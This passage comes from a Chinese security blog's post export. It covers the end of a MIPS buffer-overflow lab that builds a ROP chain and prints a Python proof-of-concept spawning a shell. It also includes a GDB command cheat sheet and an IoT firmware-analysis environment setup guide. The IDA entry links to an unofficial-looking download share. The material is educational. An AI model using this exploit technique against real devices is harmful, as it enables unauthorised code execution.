<h4 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h4><p>一般漏洞攻击的途径有两种:一是命令执行,另外一种方法是执行shellcode;<br>这里只谈命令执行的方法:<br>在源程序里面有一个函数do_system_0.虽然从代码里面可以看出，do_system_0函数只能执行“ls -l”命令,但是我们可以构造一条ROP链,通过溢出漏洞调用这个函数,使得这个函数能够执行任意命令.想要构造出ROP链,首先构造出do_system_0这个函数的两个参数,将两个参数分别 装入寄存器<br>a0和a1,这里只需要控制寄存器$a1即可,该参数是命令的字符串地址</p>
<p>使用<code>IDA</code>脚本插件<code>mipsrop.py</code>搜索合适的<code>ROP Chain</code></p>
<p><img src="http://file.smilehacker.net/ROPfinder.png" alt="寻找合适的rop链"></p>
<p><img src="http://file.smilehacker.net/ROPchain.png" alt="ROP"></p>
<p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p>
<p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p>
<p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p>
<h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">struct.pack("&lt;L","xxx")为小端序</span></span><br><span class="line"><span class="string">struct.pack("&gt;L","xxx")为大端序</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">"sh"</span> 				<span class="comment"># command string</span></span><br><span class="line">cmd += <span class="string">"\x00"</span>*(<span class="number">4</span> - (len(cmd) % <span class="number">4</span>))	<span class="comment"># align by 4 bytes</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcode = <span class="string">"A"</span>*<span class="number">0x19C</span> 			<span class="comment"># padding buf</span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00401FA0</span>) </span><br><span class="line">shellcode += <span class="string">"A"</span>*<span class="number">24</span>				<span class="comment"># padding before command</span></span><br><span class="line">shellcode += cmd				<span class="comment"># command($a1)</span></span><br><span class="line">shellcode += <span class="string">"B"</span>*(<span class="number">0x3C</span> - len(cmd))		<span class="comment"># padding </span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00400678</span>) </span><br><span class="line">shellcode += <span class="string">"BBBB"</span>				<span class="comment"># padding</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#create password file</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] create password file'</span>,</span><br><span class="line">fw = open(<span class="string">'passwd'</span>,<span class="string">'w'</span>)</span><br><span class="line">fw.write(shellcode)<span class="comment">#'A'*300+'\x00'*10+'BBBB')</span></span><br><span class="line">fw.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br></pre></td></tr></table></figure>

<p>将上述代码保存为<code>poc.py</code>,运行结果如下</p>
<p><img src="http://file.smilehacker.net/result.png" alt="result"></p>
<p>成功拿到shell</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
<li><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></li>
</ul>
]]></content>
      <categories>
        <category>安全</category>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>调试</tag>
        <tag>Debug</tag>
        <tag>Mips</tag>
        <tag>溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB调试命令--持续更新</title>
    <url>/post/25086.html</url>
    <content><![CDATA[<h2 id="GDB调试命令记录-持续更新"><a href="#GDB调试命令记录-持续更新" class="headerlink" title="GDB调试命令记录(持续更新)"></a>GDB调试命令记录(持续更新)</h2><p>记录一些GDB调试的命令,好记性不如烂笔头</p>
<h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>pwndbg</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下</p>
<a id="more"></a>

<p><img src="http://file.smilehacker.net/1570720622109.png" alt="pwndbg界面展示"></p>
<h2 id="启动GDB"><a href="#启动GDB" class="headerlink" title="启动GDB"></a>启动GDB</h2><p>对C/C++程序的调试，需要在编译前就加上-g选项:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$g</span>++ -g hello.cpp -o hello</span><br></pre></td></tr></table></figure>

<p>调试可执行文件:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gdb</span> &lt;program&gt;</span><br></pre></td></tr></table></figure>

<p>program也就是你的执行文件，一般在当前目录下。</p>
<p>调试core文件(core是程序非法执行后core dump后产生的文件):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gdb</span> &lt;program&gt; &lt;core dump file&gt;</span><br><span class="line"><span class="variable">$gdb</span> program core.11127</span><br></pre></td></tr></table></figure>

<p>调试服务程序:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gdb</span> &lt;program&gt; &lt;PID&gt;</span><br><span class="line"><span class="variable">$gdb</span> hello 11127</span><br></pre></td></tr></table></figure>

<p>如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。</p>
<h2 id="gdb交互命令"><a href="#gdb交互命令" class="headerlink" title="gdb交互命令"></a>gdb交互命令</h2><p>启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率；</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul>
<li>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</li>
<li>continue （简写c ）：继续执行，到下一个断点处（或运行结束）</li>
<li>next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。</li>
<li>step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</li>
<li>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</li>
<li>until+行号： 运行至某行，不仅仅用来跳出循环</li>
<li>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</li>
<li>call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</li>
<li>quit：简记为 q ，退出gdb</li>
</ul>
<h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><ul>
<li><p>break n （简写b n）:在第n行处设置断点</p>
<p>（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578）</p>
</li>
<li><p>b fn1 if a＞b：条件断点设置</p>
</li>
<li><p>break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button</p>
</li>
<li><p>delete 断点号n：删除第n个断点</p>
</li>
<li><p>disable 断点号n：暂停第n个断点</p>
</li>
<li><p>enable 断点号n：开启第n个断点</p>
</li>
<li><p>clear 行号n：清除第n行的断点</p>
</li>
<li><p>info b （info breakpoints） ：显示当前程序的断点设置情况</p>
</li>
<li><p>delete breakpoints：清除所有断点：</p>
</li>
</ul>
<h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><ul>
<li>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。</li>
<li>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12</li>
<li>list 函数名：将显示“函数名”所在函数的源代码，如：list main</li>
<li>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。</li>
</ul>
<h3 id="打印表达式"><a href="#打印表达式" class="headerlink" title="打印表达式"></a>打印表达式</h3><ul>
<li>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。</li>
<li>print a：将显示整数 a 的值</li>
<li>print ++a：将把 a 中的值加1,并显示出来</li>
<li>print name：将显示字符串 name 的值</li>
<li>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数</li>
<li>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</li>
<li>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a</li>
<li>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a</li>
<li>whatis ：查询变量或函数</li>
<li>info function： 查询函数</li>
<li>扩展info locals： 显示当前堆栈页的所有变量</li>
</ul>
<h3 id="查询运行信息"><a href="#查询运行信息" class="headerlink" title="查询运行信息"></a>查询运行信息</h3><ul>
<li>where/bt ：当前运行的堆栈列表；</li>
<li>bt backtrace 显示当前调用堆栈</li>
<li>up/down 改变堆栈显示的深度</li>
<li>set args 参数:指定运行时的参数</li>
<li>show args：查看设置好的参数</li>
<li>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</li>
</ul>
<h3 id="分割窗口"><a href="#分割窗口" class="headerlink" title="分割窗口"></a>分割窗口</h3><ul>
<li>layout：用于分割窗口，可以一边查看代码，一边测试：</li>
<li>layout src：显示源代码窗口</li>
<li>layout asm：显示反汇编窗口</li>
<li>layout regs：显示源代码/反汇编和CPU寄存器窗口</li>
<li>layout split：显示源代码和反汇编窗口</li>
<li>Ctrl + L：刷新窗口</li>
</ul>
<h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便；</p>
<h2 id="补充一些其他操作"><a href="#补充一些其他操作" class="headerlink" title="补充一些其他操作"></a>补充一些其他操作</h2><h3 id="调试汇编代码"><a href="#调试汇编代码" class="headerlink" title="调试汇编代码"></a>调试汇编代码</h3><ul>
<li>b fun_name : 会跳过栈初始化的过程</li>
<li>b *func_name : 不会跳过栈初始化的过程</li>
<li>b *func_name+n: 在func_name函数偏移n行的位置下断点</li>
</ul>
<p>例如:</p>
<p><img src="http://file.smilehacker.net/1570722300144.png" alt="汇编断点调试"></p>
<h3 id="GDB中使用管道进行调试"><a href="#GDB中使用管道进行调试" class="headerlink" title="GDB中使用管道进行调试"></a>GDB中使用管道进行调试</h3><p>输入的不是参数，而是标准输入(stdin)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ./vuln_prog</span><br><span class="line">run &lt; filename_with_input</span><br></pre></td></tr></table></figure>

<h3 id="GDB-查看栈帧多行数据"><a href="#GDB-查看栈帧多行数据" class="headerlink" title="GDB 查看栈帧多行数据"></a>GDB 查看栈帧多行数据</h3><p>可以清楚看到栈帧里面的情况，一目了然，前面搞死人了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stack n[要查看具体多少]</span><br></pre></td></tr></table></figure>

<p><img src="http://file.smilehacker.net/1571206209216.png" alt="查看堆栈"></p>
]]></content>
      <categories>
        <category>安全</category>
        <category>调试</category>
      </categories>
      <tags>
        <tag>调试</tag>
        <tag>安全</tag>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT测试环境搭建</title>
    <url>/post/36656.html</url>
    <content><![CDATA[<h2 id="IoT分析环境搭建"><a href="#IoT分析环境搭建" class="headerlink" title="IoT分析环境搭建"></a>IoT分析环境搭建</h2><p>因为之前没有备份的好习惯，好不容易跑起来的虚拟机说没就没，所以写一篇文章，如果以后不小心又搞丢了虚拟机，也可以快速搭建测试环境需要的工具，不需要再次寻找各种资料。</p>
<h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表:"></a>工具列表:</h2><ul>
<li>binwalk 固件提取</li>
<li>qemu 模拟执行</li>
<li><del>irmadyne 固件模拟工具</del>(这里没有安装)</li>
<li>buildroot Mips交叉编译环境</li>
<li>gdb 调试工具(可编译一个<a href="https://blog.csdn.net/zqj6893/article/details/84662579" target="_blank" rel="noopener">mips-linux-gdb</a>)</li>
<li>IDA</li>
<li>ghidra</li>
<li>GDBServer </li>
</ul>
<a id="more"></a>
<h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update  </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install build-essential autoconf git <span class="comment">#安装依赖 </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/devttys0/binwalk/blob/master/INSTALL.md  </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> binwalk  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> python2.7 </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo python setup.py install </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Python3.x</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo python3 setup.py install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./deps.sh <span class="comment">#debian/Ubuntu可使用脚本自动安装依赖</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><p>Qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。 QEMU模拟器主要有两种比较常见的运作模式：</p>
<ul>
<li>User Mode（使用者模式） User Mode模式下，用户只需要将各种不同平台的处理编译得到的Linux程序放在QEMU虚拟中运行即可，其他的事情全部由QEMU虚拟机来完成，不需要用户自定义内核和虚拟磁盘等文件；</li>
<li>System Mode（系统模式）。 System Mode模式下，最明显的特点是用户可以为QEMU虚拟机指定运行的内核或者虚拟硬盘等文件，简单来说系统模式下QEMU虚拟机是可根据用户的要求配置的</li>
</ul>
<h3 id="使用源码安装Qemu"><a href="#使用源码安装Qemu" class="headerlink" title="使用源码安装Qemu"></a>使用源码安装Qemu</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.qemu.org/qemu.git</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> qemu</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git submodule update --recursive</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install libglib2.0 libglib2.0-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install autoconf automake libtoolcd </span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure>

<p>ubuntu14.04中用源码方式编译安装qemu时,执行configure步骤提示错误：“ERROR: pixman &gt;= 0.21.8 not present.” 安装如下依赖：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libpixman-1-dev</span></span><br></pre></td></tr></table></figure>

<h2 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h2><p>github : <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p>
<h2 id="Buildroot"><a href="#Buildroot" class="headerlink" title="Buildroot"></a>Buildroot</h2><p>下载地址 : <a href="https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zxvf buildroot-2019.02.6.tar.gz</span><br><span class="line"></span><br><span class="line">cd buildroot-2019.02.6</span><br><span class="line"></span><br><span class="line">sudo apt-get install libncurses5-dev patch</span><br><span class="line"></span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>需要设置以下三个选项<br><img src="http://file.smilehacker.net/buildroot_set1.png" alt="buildroot安装选项"></p>
<ul>
<li>Target options -&gt; Target Architecture 设置为Mips (little endian)</li>
<li>Target options -&gt; Target Architecture Variant 设置为 MIPS32</li>
<li>Toolchain -&gt; Kernal Headers 设置成机器Kennal版本</li>
</ul>
<p>选择Save保存, 之后开始编译,</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure>

<p>经过一个小时的编译，在目录下产生一个<code>output</code>的目录。编译产生的工具在<code>output/host/usr/bin</code>目录下</p>
<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>一般的Linux平台下自带了GDB</p>
<p>调试MIPS平台的程序，需要安装gdb-multiarch</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure>

<p>然后按照正常的GDB使用即可</p>
<h3 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h3><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<h2 id="IDA-Linux"><a href="#IDA-Linux" class="headerlink" title="IDA(Linux)"></a>IDA(Linux)</h2><p>链接：<a href="https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw</a><br>提取码：076v </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg --add-architecture i386</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装IDA插件:</span></span><br><span class="line">git clone https://github.com/devttys0/ida.git</span><br><span class="line"></span><br><span class="line">cd plugins</span><br><span class="line"></span><br><span class="line">python install.py /IDA PATH/ --install</span><br></pre></td></tr></table></figure>

<h2 id="GDBServer"><a href="#GDBServer" class="headerlink" title="GDBServer"></a>GDBServer</h2><p>各个版本的GDBServer下载地址 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
</search>
